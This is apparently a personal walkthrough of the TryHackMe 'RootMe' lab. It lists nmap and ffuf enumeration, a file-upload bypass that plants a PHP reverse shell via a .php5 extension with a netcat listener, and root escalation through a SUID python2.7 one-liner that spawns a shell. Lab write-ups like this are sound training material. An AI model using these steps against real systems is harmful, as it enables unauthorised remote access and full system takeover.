rootme - tryhackme

##Enumeration

1: nmap scan
 - command:nmap -sV -sC -A X0.X8.1X1.1X2.

 - open ports and services run on them:

 - 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 - 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
 - OS: Linux; CPE: cpe:/o:linux:linux_kernel

2: ffuf
 - command: ffuf -w /home/haxxx/SecLists/Discovery/Web-Content/common.txt -u http://X0.X8.1X1.1X2/FUZZ

 - the hidden directorys are:
    a)/uploads
    b)/panel
    c)/index.php

3: backend Launguage running
 - php
   
##Initial Access

 - There is file upload vulnerabilty on /panel directory
 - useing .php5 extension upload a php reverse shell
 - once uploaded run
 - rlwrap nc -lvnp (port number as in reverse shell used)
 - go to /upload directory on website and run uploaded shell.php5 and get rce back

##Privelege Esculation

 - run find / -perm -u=s 2>/dev/null
 - There is a suid permision vulnerability
 - for the file /usr/bin/python2.7
 - as these file cat run as root even normal user run it hence
 - run /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 - get the root shell

## 📚 Lessons Learned

- File upload bypass using alternative PHP extensions
- Importance of checking SUID binaries
- Python SUID privilege escalation technique